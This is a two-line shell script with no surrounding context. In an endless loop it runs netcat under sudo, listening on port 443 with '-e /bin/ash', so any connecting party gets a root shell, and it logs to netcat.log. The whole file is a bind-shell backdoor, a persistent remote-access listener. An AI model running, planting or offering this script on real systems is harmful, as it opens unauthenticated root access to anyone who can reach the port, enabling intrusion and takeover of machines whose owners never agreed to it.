#!/bin/ash
while :; do sudo nc -lvp 443 -e /bin/ash 2> netcat.log ; done
